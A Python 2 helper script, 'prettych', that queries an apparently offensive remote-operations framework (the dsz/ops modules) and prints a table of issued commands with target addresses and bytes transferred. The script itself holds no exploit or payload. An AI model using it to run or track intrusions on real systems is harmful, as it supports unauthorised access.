
import sys
import dsz
import ops.cmd, ops.data
from ops.pprint import pprint
from ops.parseargs import ArgumentParser
LOCATION_LOCAL = 0
LOCATION_REMOTE = 1

def main(args=[]):
    flags = dsz.control.Method()
    if ((__name__ == '__main__') and (dsz.script.Env['script_parent_echo_disabled'].lower() == 'true')):
        dsz.control.quiet.On()
    parser = ArgumentParser(prog='prettych', add_help=False)
    cmdopts = parser.add_argument_group(title='commands options')
    cmdopts.add_argument('--all', action='store_true', help='Also display finished commands')
    cmdopts.add_argument('--any', action='store_true', help='Display commands from any address')
    locationgrp = cmdopts.add_mutually_exclusive_group()
    locationgrp.add_argument('--local', dest='location', default=LOCATION_LOCAL, const=LOCATION_LOCAL, action='store_const', help='List local commands (default)')
    locationgrp.add_argument('--remote', dest='location', const=LOCATION_REMOTE, action='store_const', help='List remote commands')
    cmdopts.add_argument('--astyped', action='store_true', help='Show commands as typed (rather than displaying expanded aliases)')
    cmdopts.add_argument('--verbose', action='store_true', help='Show additional command information')
    parser.add_argument('--echo', dest='dszquiet', default=True, action='store_false', help='Echo out the raw DSZ commands output in addition to pretty printing.')
    options = parser.parse_args(args)
    commands = ops.cmd.getDszCommand('commands', prefixes=['stopaliasing'], all=options.all, any=options.any, astyped=options.astyped, verbose=options.verbose, dszquiet=options.dszquiet)
    if (options.location == LOCATION_LOCAL):
        header = []
        fields = []
        if options.all:
            header.append('Status')
            fields.append('status')
        header.extend(['ID', 'Target'])
        fields.extend(['id', 'targetaddress'])
        if (options.astyped or options.verbose):
            header.append('Command (as-typed)')
            fields.append('commandastyped')
        if ((not options.astyped) or options.verbose):
            header.append('Full Command')
            fields.append('fullcommand')
        header.extend(['Sent', 'Received'])
        fields.extend(['bytessent', 'bytesreceived'])
    elif (options.location == LOCATION_REMOTE):
        commands.remote = True
        header = ['ID', 'Command']
        fields = ['id', 'name']
    else:
        print 'You win a prize! Also, you fail.'
        sys.exit((-1))
    result = commands.execute()
    if (__name__ == '__main__'):
        ops.data.script_export(result)
    if (__name__ == '__main__'):
        for i in xrange(len(result.command)):
            if (result.command[i].id == int(dsz.script.Env['script_command_id'])):
                del result.command[i]
                break
    pprint(result.command, header=header, dictorder=fields)
    del flags
    return True
if (__name__ == '__main__'):
    main(sys.argv[1:])